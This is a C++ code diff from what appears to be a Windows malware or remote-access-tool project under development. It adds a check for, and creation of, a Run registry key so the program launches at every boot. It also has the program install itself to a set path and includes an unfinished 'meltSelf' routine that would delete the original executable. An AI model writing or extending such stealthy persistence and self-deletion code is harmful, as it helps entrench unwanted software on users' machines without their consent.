@@ -42,7 +42,10 @@ bool locationSet()		//checks if executable is located in install position
 
 bool startupSet()		//checks if executable is starting on boot
 {
-	return true;
+	if (regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName.c_str()))
+		return true;
+	else
+		return false;
 }
 
 bool installed()		//checks if executable is installed properly (location + startup)
@@ -63,7 +66,11 @@ void installCheck()		//checks if this run of the program is designated to the in
 	if (installing)
 		if (!startOnNextBoot)
 		{
-			startProcess(installPath.c_str(), meltSelf ? const_cast<char *>(currentPath.c_str()) : NULL);		//CHANGE ARGS TO SMTH DIFFERENT TO SUPPLY MELT PATH (SENDS ARGS ON EXECUTION TO PROVIDE LOCATION OF OLD FILE (THAT IS TO BE MELTED))
+			if (meltSelf)
+			{			//ONLY AN ALTERNATIVE; CREATEPROCESS NEEDS WORK
+
+			}
+			startProcess(installPath.c_str(), NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
 		}
 
 }
@@ -83,6 +90,13 @@ int init()		//startup of program
 		}
 	}
 
+	if (setStartupSelf)
+	{
+		if (!startupSet())
+		{
+			setStartup(convStringToWidestring(startupName).c_str(), installSelf ? convStringToWidestring(installPath).c_str() : convStringToWidestring(currentPath).c_str(), NULL);
+		}
+	}
 	
 
 	installCheck();
@@ -94,7 +108,6 @@ int init()		//startup of program
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
-	testMB("test");
 	//init();
 	return 0;
 }
